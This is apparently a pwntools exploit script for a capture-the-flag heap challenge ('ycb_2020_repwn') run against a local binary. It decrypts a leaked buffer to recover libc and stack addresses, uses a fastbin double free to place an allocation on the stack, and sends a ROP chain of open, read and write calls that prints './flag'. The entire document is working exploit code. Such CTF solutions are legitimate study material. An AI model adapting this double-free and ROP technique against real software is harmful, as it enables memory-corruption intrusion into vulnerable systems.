from pwn import *
context(log_level='debug',os='linux',arch='amd64')

binary = './data/bin/heap23_57_ycb_2020_repwn'
r = process(binary)
elf = ELF(binary)
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-h']

def Allocate(size,payload=b'/bin/sh\x00'):
    r.sendlineafter("your choice:",'1')
    r.sendlineafter("how long?",str(size))
    r.send(payload)

def Free(idx):
    r.sendlineafter("your choice:",'3')
    r.sendlineafter("which one?",str(idx))

def dec(res):
    v5 = [51,18,120,36]
    v9 = 9
    v7 = 0x26a77aaa
    while v9 > 0:
        v10 = (v7 >> 2) & 3
        for i in range(15,-1,-1):
            v6 = res[(i-1+16)%16]
            res[i] -= (((v6 >> 7) ^ 8 * res[(i + 1)%16]) + ((res[(i + 1)%16] >> 2) ^ 32 * v6) - 33) ^ ((res[(i + 1)%16] ^ v7 ^ 0x57)+ (v6 ^ v5[v10 ^ i & 3])+ 63)
            res[i] &= 0xff
        v7 -= 0x76129BDA
        v7 &= 0xffffffff
        v9 -= 1

r.sendlineafter("your choice:",'2')#leak
r.sendline()
rev = r.recv(0x10)
res = []
print(rev[0])
for i in range(len(rev)):
    res.append(rev[i])

dec(res)
addr = ''
for i in range(len(rev)):
    addr += chr(res[i])

libc_base  = u64(addr[:8].ljust(8,'\x00'))-0x5F1A88
stack_addr = u64(addr[8:].ljust(8,'\x00'))

Allocate(0x68)#0
Allocate(0x68)#1
Allocate(0x68)#2
Free(0)
Free(1)
Free(0)#double free
Allocate(0x68,p64(stack_addr-0xf3))

pop_rdi_ret = 0x0000000000021102 + libc_base
pop_rsi_ret = 0x00000000000202e8 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base
pop_rax_ret = 0x0000000000033544 + libc_base# 0x000000000003a718
pop_rsp_ret = 0x0000000000003838 + libc_base
open_addr  = libc.symbols['open']  + libc_base
read_addr  = libc.symbols['read']  + libc_base
write_addr = libc.symbols['write'] + libc_base
payload  = b'a'*3+p64(pop_rdx_ret)+p64(0x200)+p64(read_addr)+p64(pop_rsp_ret)+p64(stack_addr)
payload += flat([pop_rdi_ret,0,pop_rsi_ret,stack_addr,pop_rsp_ret,stack_addr-0xe0])

Allocate(0x68)#3
Allocate(0x68)#4
success("libc_base -> "+hex(libc_base))
success("stack_addr -> "+hex(stack_addr))
#gdb.attach(r)
Allocate(0x68,payload)#5

payload2  = flat([pop_rdi_ret,stack_addr+0xa8,pop_rsi_ret,4,pop_rdx_ret,4,open_addr])
payload2 += flat([pop_rdi_ret,3,pop_rsi_ret,stack_addr+0xb0,pop_rdx_ret,0x50,read_addr])
payload2 += flat([pop_rdi_ret,1,pop_rsi_ret,stack_addr+0xb0,pop_rdx_ret,0x50,write_addr])
payload2  = payload2.ljust(0xa0,b'b')+b'./flag\x00\x00\x00\x00' 
sleep(0.2)
r.sendline(payload2)

r.interactive()